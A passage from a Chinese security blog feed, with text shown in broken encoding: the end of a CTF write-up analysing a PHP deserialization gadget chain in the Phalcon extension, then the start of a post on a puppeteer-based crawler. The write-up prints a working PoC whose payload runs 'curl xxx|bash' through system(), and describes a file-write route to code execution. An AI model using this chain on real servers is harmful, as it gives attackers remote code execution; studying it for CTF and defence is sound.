numFound=&quot;1&quot; start=&quot;0&quot; numFoundExact=&quot;true&quot;&gt;  &lt;doc name=&quot;byc&quot;&gt;          &lt;int name=&quot;a&quot;&gt;123456;i:1;O:4:&quot;Evil&quot;:0:{}}}}}}&lt;/int&gt;          &lt;str name=&quot;q&quot;&gt;lucene&lt;/str&gt;  &lt;/doc&gt;&lt;/result&gt;&lt;/response&gt;</code></pre><p>è¿˜æ˜¯ç”¨åˆšåˆšçš„node serverã€‚æœ¬åœ°çœ‹ä¸‹ç»“æœ<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_476c5f23bf8d5a1f57e5226c244d7287.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_476c5f23bf8d5a1f57e5226c244d7287.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å‘ç°å¯ä»¥è§¦å‘ååºåˆ—åŒ–ã€‚åˆ°æ­¤ä¸ºæ­¢ï¼Œè¿™é“é¢˜çš„æ¼æ´éƒ¨åˆ†å°±å·²ç»åˆ†æå®Œäº†ã€‚</p><h2 id="gadget"><a href="#gadget" class="headerlink" title="gadget"></a>gadget</h2><p>ç„¶åå°±æ˜¯å¦‚ä½•åœ¨é¢˜ç›®è¿œç¨‹æ‰¾åˆ°è§¦å‘ååºåˆ—åŒ–çš„é—®é¢˜äº†ã€‚ç„¶è€Œè‡ªå·±ä¸€æ–¹é¢æ²¡çœ‹åˆ°é¢˜ç›®ç»™çš„phpinfo.phpï¼Œå¦ä¸€æ–¹é¢æ²¡æ—¶é—´çœ‹é¢˜ã€‚ã€‚ã€‚æ‰€ä»¥å½“æ—¶ç›´æ¥æ”¾å¼ƒäº†ã€‚åæ¥çœ‹é¢˜è§£çš„é“¾å­ï¼Œæ„Ÿè§‰è¿˜æ˜¯æœ‰äº›éš¾åº¦çš„ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e461a4f7132eca9369fd67455930a1e7.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_e461a4f7132eca9369fd67455930a1e7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ³¨æ„åˆ°æ‰©å±•è¿™é‡Œçš„phalcon, æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°æºç cphalconã€‚ä¼šå‘ç°å…¶æºç éƒ½æ˜¯.zepæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯ç¼–è¯‘æˆcåä½œä¸ºæ‰©å±•ä½¿ç”¨ã€‚ä½†æ˜¯æ•´ä½“é£æ ¼è·Ÿphpå·®ä¸å¤šã€‚æ‰€ä»¥ç›´æ¥æ‰‹åŠ¨å®¡å°±è¡Œäº†ã€‚</p><p>å…¥å£æ˜¯ä¸ªæŠ½è±¡ç±»AbstractAdapter<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6d090aad0104828e6c97325ff75a4015.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_6d090aad0104828e6c97325ff75a4015.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>åç»­æ ¹æ®<code>defaultFormatter</code>è°ƒç”¨commitæ–¹æ³•ã€‚è¿™é‡Œå¯ä»¥æ‰¾åˆ°å®ç°è¿™ä¸ªæŠ½è±¡ç±»çš„Streamç±»ã€‚ä½œä¸ºæˆ‘ä»¬payloadå®ä¾‹åŒ–çš„å¯¹è±¡ã€‚ç„¶åä¼šå‘ç°æœ€ç»ˆè°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œä¼šè°ƒç”¨å…¶processæ–¹æ³•ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5c9f06ad9e6ab4af289a3c9077e5ad65.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5c9f06ad9e6ab4af289a3c9077e5ad65.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥å¦‚æœèƒ½æŠŠmessageæ§ä½ï¼Œè¿™é‡Œå°±æœ‰ä¸ªä»»æ„æ–‡ä»¶å†™ã€‚æˆ‘ä»¬å›åˆ°æŠ½è±¡ç±»çœ‹ä¸‹<code>getFornatedItem</code>å‘ç°ä¼šå®ä¾‹åŒ–ä¸€ä¸ªLogger\Formatterä¸‹çš„ç±»ä½œä¸ºformater,è°ƒç”¨å…¶formatæ–¹æ³•ã€‚<br>ä»¥Jsonä¸ºä¾‹<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_59c8eade8feea8088564477e2ee0214c.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_59c8eade8feea8088564477e2ee0214c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åšåˆ°äº†è°ƒç”¨å¯æ§å‚æ•°çš„<code>getTime()</code>æ–¹æ³•ã€‚æ­¤æ—¶å¸¸è§çš„ä¸€ä¸ªæ€è·¯å°±æ˜¯å…¨å±€æ‰¾<code>__call</code>æ‰©å±•åˆ©ç”¨é“¾ã€‚</p><p>è¿™é‡Œåæ¥çœ‹äº†ä¸‹zsxçš„é“¾è·ŸNu1Lçš„é“¾ã€‚å…¶å®éƒ½ç”¨äº†åŒä¸€ä¸ª<code>__call</code></p><p>çœ‹åˆ°Di.zep</p><pre><code class="php">public function __call(string! method, array arguments = []) -&gt; var | null{    var instance, possibleService, definition;    /**     * If the magic method starts with &quot;get&quot; we try to get a service with     * that name     */    if starts_with(method, &quot;get&quot;) {        let possibleService = lcfirst(substr(method, 3));        if isset this-&gt;services[possibleService] {            let instance = this-&gt;get(possibleService, arguments);            return instance;        }    }......</code></pre><p>è¿™ä¸ªä½¿ç”¨æŒºå¸¸è§çš„ï¼Œä¸€èˆ¬å¸¸è§äºå¤„ç†getterï¼Œsetterå‹çš„æ–¹æ³•ã€‚é‚£ä¹ˆæ­¤å¤„æˆ‘ä»¬æ§åˆ¶ä½<code>services</code>æ•°ç»„ã€‚å°±èƒ½è°ƒç”¨å…¶getæ–¹æ³•ã€‚<br>getæ–¹æ³•çš„æ ¸å¿ƒåœ¨<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_2e194cca7074bf82083c55fdae7462b8.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_2e194cca7074bf82083c55fdae7462b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å…¨å±€æ‰¾ä¼šå‘ç°ä¸€ä¸ªæ¯”è¾ƒå¥½ç”¨çš„resolveã€‚å³\Diä¸‹çš„Serviceç±»resolveæ–¹æ³•ã€‚<br>resolveæ–¹æ³•ã€‚æˆ‘ä»¬é¦–å…ˆæ³¨æ„åˆ°definitionå¯æ§ã€‚å¦‚æœæ˜¯å­—ç¬¦ä¸²çš„è¯ï¼Œå¯ä»¥å®ä¾‹åŒ–ç±»ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_8ba8c7dd346dfdf9f1eabf731030cbd0.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_8ba8c7dd346dfdf9f1eabf731030cbd0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å¦‚æœæ˜¯å…¶ä»–çš„è¯ï¼Œä¼šè°ƒç”¨builderæ¥build</p><p>åˆ°è¿™é‡Œæˆ‘çœ‹äº†ä¸‹ï¼ŒNu1Lè·Ÿzsxçš„é“¾å­å°±æœ‰å·®åˆ«äº†ã€‚<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_b84d3cc07fea0eaf687fb9a3aff8d719.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_b84d3cc07fea0eaf687fb9a3aff8d719.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>Nu1Lé€‰æ‹©èµ°ä¸Šé¢ï¼Œ å¯ä»¥åšåˆ°å®ä¾‹åŒ–ä¸€ä¸ªç±»ä¸”æ„é€ æ–¹æ³•å‚æ•°å¯æ§ã€‚ç„¶ååé¢ä»£ç éƒ½ä¸æ‰§è¡Œç›´æ¥è¿”å›äº†ã€‚</p><p>zsxæ˜¯å•çº¯å®ä¾‹åŒ–ä¸€ä¸ªç±»ã€‚ç„¶åç»§ç»­èµ°ä¸‹é¢ã€‚</p><p>buildæ–¹æ³•ä¸‹é¢çš„å…³é”®ä»£ç å°±åœ¨ï¼š</p><pre><code class="php">for methodPosition, method in paramCalls {    /**     * The call parameter must be an array of arrays     */    if unlikely typeof method != &quot;array&quot; {        throw new Exception(            &quot;Method call must be an array on position &quot; . methodPosition        );    }    /**     * A param &#39;method&#39; is required     */    if unlikely !fetch methodName, method[&quot;method&quot;] {        throw new Exception(            &quot;The method name is required on position &quot; . methodPosition        );    }    /**     * Create the method call     */    let methodCall = [instance, methodName];    if fetch arguments, method[&quot;arguments&quot;] {        if unlikely typeof arguments != &quot;array&quot; {            throw new Exception(                &quot;Call arguments must be an array &quot; . methodPosition            );        }        if count(arguments) {            /**             * Call the method on the instance             */            call_user_func_array(                methodCall,                this-&gt;buildParameters(container, arguments)            );            /**             * Go to next method call             */            continue;        }    }    /**     * Call the method on the instance without arguments     */    call_user_func(methodCall);}</code></pre><p>ç”±äºæˆ‘ä»¬ä¸Šé¢instanceå¯æ§ã€‚è¿™ä¸ªä»£ç å—é‡Œ<code>methodCall</code>,<code>this-&gt;buildParameters(container, arguments)</code>è·Ÿè¿›çœ‹çš„è¯å…¶å®éƒ½æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥ç›¸å½“äºæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œä¸€ä¸ª<code>create_instance</code>å®ä¾‹åŒ–çš„ç±»çš„ä»»æ„æ–¹æ³•ï¼Œä¸”å‚æ•°å¯æ§ã€‚</p><p>è¿™é‡Œzsxçš„é“¾å­æ˜¯ï¼Œcreate_instanceå®ä¾‹åŒ–ä¸€ä¸ªValidationç±»ã€‚ç„¶åè°ƒç”¨addæ–¹æ³•è®¾ç½®å¥½è¿™ä¸ªValidationçš„validatorã€‚ç„¶åæ³¨æ„åˆ°ä¸Šé¢<code>for methodPosition, method in paramCalls</code>æ˜¯å¾ªç¯è°ƒç”¨çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¿˜èƒ½å†è°ƒç”¨åŒä¸€ä¸ªinstanceçš„å¦ä¸€ä¸ªæ–¹æ³•ã€‚æ­¤å¤„å³<code>validate</code>æ–¹æ³•ã€‚</p><p>è¿™ä¸ªæ–¹æ³•å¦™åœ¨ï¼Œä¸Šé¢å®ä¾‹åŒ–æ—¶ï¼Œè™½ç„¶ç±»çš„å‚æ•°æ²¡æœ‰è®¾ç½®ä¸ºå¯æ§å€¼ã€‚ä½†æ˜¯ç”±äºåŒä¸€ä¸ªinstanceå¾ªç¯è°ƒç”¨è¿™ç‚¹ï¼Œå°±å¯ä»¥å…ˆè°ƒç”¨addæ–¹æ³•è®¾ç½®å¥½å‚æ•°ï¼Œå†è°ƒç”¨validateæ–¹æ³•æ‰§è¡Œå‘½ä»¤ã€‚<br>è¿™é‡Œvalidatoræ˜¯ç”¨çš„Callback<br><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_be8eb110d3cd2a72f7c688acff81611c.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_be8eb110d3cd2a72f7c688acff81611c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>callbackå®Œå…¨å¯æ§ã€‚ä¸è¿‡<br>è¿™é‡Œzsxçš„å‚æ•°æ˜¯ç”¨\Phalcon\Acl\Component()æ§ä½çš„ã€‚å…¶å®æ˜¯å› ä¸ºvalidateæ–¹æ³•åªæ¥æ”¶æ•°ç»„æˆ–å¯¹è±¡ä½œå‚æ•°ã€‚é‚£ä¹ˆæ‰¾ä¸€ä¸ª<code>__toString</code>å°±è¡Œäº†ã€‚</p><p>poc</p><pre><code class="php">&lt;?phpnamespace Phalcon\Acl;class Component {    public $name = &quot;curl xxx|bash&quot;;}namespace Phalcon\Validation\Validator;class Callback {    public $options = [        &quot;message&quot; =&gt; &quot;&quot;,        &quot;callback&quot; =&gt; &quot;system&quot;    ];}namespace Phalcon\Di;class Service {    public $definition;    public $resolved = false;    public $shared = false;    public $sharedInstance = null;    public $eventsManager = null;    public function __construct($definition) {        $this-&gt;definition = $definition;    }}namespace Phalcon;class Di {    public $services;    public function __construct($services) {        $this-&gt;services = $services;    }}namespace Phalcon\Logger\Adapter;abstract class AbstractAdapter {    public $defaultFormatter= &quot;Json&quot;;    public $formatter;    public $inTransaction = true;    public $queue;}class Stream extends  AbstractAdapter {    public $handler = null;    public $mode = &quot;ab&quot;;    public $name = &quot;/tmp/byc&quot;;    public function __construct($queue) {        $this-&gt;queue = $queue;    }}$poc = new Stream([        new \Phalcon\Di([            &quot;context&quot;=&gt; new \Phalcon\Di\Service([                &quot;className&quot; =&gt; &quot;Phalcon\Validation&quot;,                &quot;arguments&quot; =&gt; [],                &quot;calls&quot; =&gt; [                    [                        &quot;method&quot; =&gt; &quot;add&quot;,                        &quot;arguments&quot; =&gt; [                            [                                &quot;type&quot; =&gt; &quot;parameter&quot;,                                &quot;value&quot; =&gt; [&quot;&quot;]                            ],                            [                                &quot;type&quot; =&gt; &quot;parameter&quot;,                                &quot;value&quot; =&gt; new \Phalcon\Validation\Validator\Callback()                            ]                        ]                    ],                    [                        &quot;method&quot; =&gt; &quot;validate&quot;,                        &quot;arguments&quot; =&gt; [                            [                                &quot;type&quot; =&gt; &quot;parameter&quot;,                                &quot;value&quot; =&gt; new \Phalcon\Acl\Component()                            ]                        ]                    ]                ]            ])        ])]);echo (serialize($poc));</code></pre><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_46e86d905e1b9caf5c30080e5f8bcf4a.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_46e86d905e1b9caf5c30080e5f8bcf4a.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>è¿˜æœ‰Nu1Lçš„æ–¹æ³•ã€‚æ•´ä½“ä¸Šå…¶å®æ¯”è¾ƒå¥½æƒ³ã€‚å› ä¸ºå‰é¢å·²ç»æœ‰ä¸€ä¸ªfwriteäº†ã€‚æ§åˆ¶ä½å‚æ•°å°±èƒ½ä»»æ„å†™ã€‚ç„¶åå¦‚æœæœ‰æ–‡ä»¶åŒ…å«å°±èƒ½rceäº†ã€‚</p><p><img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5c0d0bc9fdf15317efe3eb48358adfb9.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_5c0d0bc9fdf15317efe3eb48358adfb9.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>è¿™ä¸ªç±»ç›´æ¥æ„é€ æ–¹æ³•å°±èƒ½æ–‡ä»¶åŒ…å«ã€‚æ‰€ä»¥åˆ°ä¸Šé¢é‚£æ­¥<code>create_instance</code>å°±å¯ä»¥åŒ…å«äº†ã€‚</p><p>å†™æ–‡ä»¶çš„è¯æ›´ç®€å•ã€‚åœ¨formaté‚£ä¸ç”¨è§¦å‘<code>__call</code>ã€‚ç›´æ¥æ§åˆ¶å¥½é‡Œé¢å„ä¸ªæ–¹æ³•å‚æ•°å°±èƒ½ç›´æ¥fwriteã€‚</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p> æ¯”èµ›æœ‰æ—¶é—´è‚è¿™é¢˜çš„è¯ï¼Œåº”è¯¥æ”¶è·æŒºå¤§çš„ã€‚ã€‚ã€‚<br> å…¶ä»–é¢˜è´¨é‡ä¹Ÿéå¸¸ä¸é”™ï¼Œæ¯”å¦‚2ä¸ªjavaã€‚å¸Œæœ›æœ‰æœºä¼šèƒ½çœ‹åˆ°wuyxå¸ˆå‚…è·Ÿcclå¸ˆå‚…æ”¾å‡ºå®Œæ•´é¢˜è§£~</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨Node.jså®ç°åŠ¨æ€çˆ¬è™«</title>
      <link href="2021/06/06/%E4%BD%BF%E7%94%A8Node-js%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E7%88%AC%E8%99%AB/"/>
      <url>2021/06/06/%E4%BD%BF%E7%94%A8Node-js%E5%AE%9E%E7%8E%B0%E5%8A%A8%E6%80%81%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<p>  æœ¬æ–‡æ˜¯å…³äºè‡ªå·±ç”¨Node.jså®ç°åŠ¨æ€çˆ¬è™«çš„ä¸€äº›è®°å½•ä»¥åŠè¸©å‘ã€‚</p><a id="more"></a><h2 id="èµ·æ‰‹å¼"><a href="#èµ·æ‰‹å¼" class="headerlink" title="èµ·æ‰‹å¼"></a>èµ·æ‰‹å¼</h2><p>  ç¬¬ä¸€ä¸ªé—®é¢˜å°±æ˜¯çˆ¬è™«çš„è¯­è¨€é€‰æ‹©ã€‚æ ¹æ®ä¸ªäººå–œå¥½ä»¥åŠä¹‹å‰å†™è¿‡çš„å¾ˆå¤šdemoï¼Œç¼–ç¨‹è¯­è¨€ä»¥åŠæ¨¡å—æ¯‹åº¸ç½®ç–‘æ˜¯é€‰ç”¨å½“å‰æœ€å¥½çš„headless Chrome jsä¾èµ–puppeteeräº†,åœ¨æ­¤ä¹‹ä¸Šè€ƒè™‘å¹¶å‘é—®é¢˜æ‰€ä»¥é€‰ç”¨puppeteer-cluster.<br>    <code>puppeteer</code>çš„æ“ä½œä¸€èˆ¬éƒ½æ˜¯åŸºäºåŠŸèƒ½å¼ºå¤§çš„<code>page</code>æ¥æ“ä½œçš„ã€‚ä¸€äº›å¸¸è§çš„apiå¦‚<code>$</code>,<code>$$</code>(ç›¸å½“äºquerySelector,querySelectorAll),<code>evaluate</code>ç­‰åŸºæœ¬ä¿è¯æˆ‘ä»¬å¿«é€Ÿå®ç°å®šä½å…ƒç´ ä»¥åŠåœ¨æµè§ˆå™¨çš„contextä¸‹æ‰§è¡Œjavascript çš„åŠŸèƒ½ã€‚è¿™æ¬¡å†™çš„æ—¶å€™è¿˜å¦å¤–æ³¨æ„åˆ°åŸæ¥<code>ElementHandle</code>ç±»(å³ä½¿ç”¨<code>$</code>,<code>$$</code>å¾—åˆ°çš„node)ä¹Ÿå¯ä»¥ç›´æ¥<code>evaluate</code>,è¿™æ ·å°±èŠ‚çœäº†å¾ˆå¤šä¸å¿…è¦çš„æ“ä½œã€‚<br>  ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼Œæˆ‘å†™è¿™ä¸ªçˆ¬è™«å¸Œæœ›è¾¾åˆ°çš„æ•ˆæœæ˜¯ä»€ä¹ˆ(å› ä¸ºè€å®è¯´å†™é¡¹ç›®è¿™ç‚¹ä¸Šè‡ªå·±æ›´å¤šæ˜¯ä»»åŠ¡é©±åŠ¨è€Œä¸æ˜¯ä¸»è§‚ä¸Šå¸Œæœ›å®ç°ä»€ä¹ˆ)ã€‚ä»æœ€ç»ˆç»“æœæ¥çœ‹,æˆ‘è®¤ä¸ºå¤§ä½“ä¸Šæ˜¯ä»¥æ­é…è¢«åŠ¨æ‰«æå™¨ä¸ºç›®çš„,å³æŠŠæ‰«æå™¨ä½œä¸ºcrawlerçš„ä»£ç†ã€‚è¿™æ ·çš„è¯,çˆ¬è™«çš„è¦æ±‚å°±åº”è¯¥æ˜¯å°½å¯èƒ½å¤šçš„è§¦å‘äº‹ä»¶ï¼Œå°½å¯èƒ½å¤šçš„æœé›†urlã€‚<br>  ç›®å‰çœ‹æ¥github ä¸Šæ¯”è¾ƒå—æ¬¢è¿çš„æ˜¯ <a href="https://github.com/0Kee-Team/crawlergo" target="_blank" rel="noopener">crawlergo</a> è·Ÿ <a href="https://github.com/knownsec/LSpider" target="_blank" rel="noopener">LSpider</a>,å„æœ‰ç‰¹è‰²ã€‚æˆ‘ä¸ªäººä¸»è¦æ˜¯æŒ‰ç…§<a href="https://github.com/LFYSec/CrawlerNode" target="_blank" rel="noopener">LFY</a>çš„æ€è·¯ä»¥åŠå‡ ç¯‡å‚è€ƒæ–‡ç« å®è·µçš„ã€‚</p><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><p>puppeteer çš„å¯åŠ¨å‚æ•°ä¸Šï¼Œä¸»è¦æ˜¯æ³¨æ„å…³é—­XSS Auditorå¹¶å…è®¸ä¸å®‰å…¨å†…å®¹ã€‚å½“ç„¶è¿˜æœ‰æ¯”è¾ƒé‡è¦çš„å…³gpu,no-sandboxç­‰ç­‰,ä¸»è¦æ˜¯ä¸ºäº†èŠ‚çº¦èµ„æºã€‚</p><pre><code class="json">{    &quot;puppeteerOptions&quot;:          &quot;args&quot;: [            &quot;--disable-gpu&quot;,            &quot;--disable-dev-shm-usage&quot;,            &quot;--disable-web-security&quot;,            &quot;--disable-xss-auditor&quot;,            &quot;--no-zygote&quot;,            &quot;--no-sandbox&quot;,            &quot;--disable-setuid-sandbox&quot;,            &quot;--allow-running-insecure-content&quot;,            &quot;--disable-webgl&quot;,            &quot;--disable-popup-blocking&quot;        ]}</code></pre><p>ç„¶åå°±æ˜¯å¸¸è§„çš„pageè®¾ç½®ã€‚UAè®¾ç½®ä¸ºéšæœºUAä¸å¿…å¤šè¯´ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯å¼€å¯requestæ‹¦æˆªä»¥åŠæ³¨å…¥hookä»£ç ã€‚è¿™äº›ä¼šåœ¨ä¸‹é¢è°ˆåˆ°ã€‚</p><h2 id="hookJS"><a href="#hookJS" class="headerlink" title="hookJS"></a>hookJS</h2><p> æˆ‘ä»¬éœ€è¦åœ¨domæ„å»ºä¹‹å‰å°±hook Javascriptã€‚è¿™ä¸€æ­¥çš„ç›®çš„å½“ç„¶æ˜¯ä¸ºäº†åœ¨domæ„å»ºä¹‹å‰å°±å°½å¯èƒ½å¤šçš„æ”¶é›†url.æ‰€ä»¥ä¸Šé¢ä½¿ç”¨<code>await page.evaluateOnNewDocument(hookJS);</code>æ¥åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥ JavaScript ä»£ç ã€‚</p><p> å…·ä½“hookæ€è·¯å¾ˆç®€å•,ä¸€äº›æœ‰å¯èƒ½å¯¼è‡´é¡µé¢é‡å®šå‘æˆ–è€…é˜»å¡çš„å‡½æ•°å¦‚<code>window.open</code>æˆ–<code>window.close</code>ï¼Œæˆ‘ä»¬æŠŠå®ƒhookäº†;(å…¶å®å¼¹çª—ä¹Ÿä¼šé˜»å¡,ä¸è¿‡æˆ‘ä»¬æœ‰ä¸“é—¨çš„apiæ¥å…³é—­å¼¹çª—ã€‚)ä¸€äº›å‚æ•°é‡Œæœ‰urlçš„æˆ‘ä»¬è·å–åˆ°å‚æ•°å­˜èµ·æ¥ç„¶åæ­£å¸¸æ‰§è¡Œ;ä¸€äº›åƒè¶…æ—¶çš„ä»£ç å¦‚<code>setTimeout</code>,<code>setInterVal</code>æˆ‘ä»¬æŠŠå®ƒæ—¶é—´æ§åˆ¶åœ¨1så¤šã€‚ (æ³¨æ„è¿™ä¸¤ä¸ªå‡½æ•°å‚æ•°éƒ½æ˜¯ms)<br> é™¤æ­¤ä»¥å¤–è¿˜éœ€è¦hook äº‹ä»¶æ³¨å†Œã€‚åˆšå¥½å€Ÿæ­¤å­¦ä¹ åˆ°äº†äº‹ä»¶æ³¨å†Œçš„ä¸¤ç§æ–¹å¼ã€‚<br> ä¸€ç§æ˜¯æ—©æœŸçš„dom0æ³¨å†Œ<br> <img src="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_acd8bfdf6ef1812cab2184630d8ff5e0.png" class="lazyload" data-srcset="https://imgbucket404.oss-cn-beijing.aliyuncs.com/img/upload_acd8bfdf6ef1812cab2184630d8ff5e0.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>å½“ç„¶è¿™ç§æ–¹å¼å·²ç»è¿‡æ—¶äº†ï¼Œæ‰€ä»¥æˆ‘æ‰€äº†è§£åˆ°çš„æ›´å¤šæ˜¯ç¬¬äºŒç§æ³¨å†Œæ–¹å¼<code>addEventListener</code>,å³dom2çº§æ³¨å†Œã€‚</p><pre><code class="javascript">function bgChange() {  const rndCol = &#39;rgb(&#39; + random(255) + &#39;,&#39; + random(255) + &#39;,&#39; + random(255) + &#39;)&#39;;  document.body.style.backgroundColor = rndCol;}btn.addEventListener(&#39;click&#39;, bgChange);</code></pre><p> æ‰€ä»¥hookä¸¤ç§äº‹ä»¶çš„æ–¹å¼å½“ç„¶å°±ä¸åŒäº†ï¼Œå‰è€…æ˜¯è®¾ç½®è®¿é—®å™¨å±æ€§,åè€…ç›´æ¥hook <code>addEventListener</code>åŸå‹å³å¯ã€‚<br> å…·ä½“å‚è€ƒ <a href="https://www.anquanke.com/post/id/178339#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178339#h2-2</a></p><p> è¿™é‡ŒhookJS 